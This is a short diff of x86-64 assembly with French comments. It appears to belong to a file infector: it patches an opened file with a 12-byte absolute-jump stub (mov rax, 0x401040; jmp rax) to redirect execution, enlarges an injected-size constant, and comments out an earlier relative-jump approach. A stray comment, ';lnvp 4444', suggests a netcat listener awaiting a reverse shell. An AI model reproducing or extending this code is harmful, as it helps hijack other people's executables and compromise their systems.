@@ -23,12 +23,14 @@ section .data
     ;lnvp 4444
 
 
-    taille_exagereted dq 0x1000
+    taille_exagereted dq 0xc000
 
 
-    jump_insctruction db 0xe9
+    ;jump_insctruction db 0xe9
     ;tmp
-    jump_offset dd -0x000BC02c42
+    ;jump_offset dd -0x00000073F
+
+    jump_insctruction db 0x48, 0xb8, 0x40, 0x10, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0xff, 0xe0
 
 ;
 ;
@@ -340,23 +342,23 @@ mov r15, buffer
     mov rax, 1         
     mov rdi, [file_descriptor]       
     mov rsi, jump_insctruction  
-    mov rdx, 1
+    mov rdx, 12
     syscall    
 
 
 ; =============== Ajout offset a sauter  =================
 
-    mov rax, 8          
-    mov rdi, [file_descriptor]
-    mov rsi, 0 
-    mov rdx, 2        ; fin du fichier 
-    syscall  
+;    mov rax, 8          
+;    mov rdi, [file_descriptor]
+;    mov rsi, 0 
+;    mov rdx, 2        ; fin du fichier 
+;   syscall  
 
-    mov rax, 1         
-    mov rdi, [file_descriptor]       
-    mov rsi, jump_offset 
-    mov rdx, 4
-    syscall
+;    mov rax, 1         
+;    mov rdi, [file_descriptor]       
+;    mov rsi, jump_offset 
+;    mov rdx, 4
+;    syscall
       
 
 
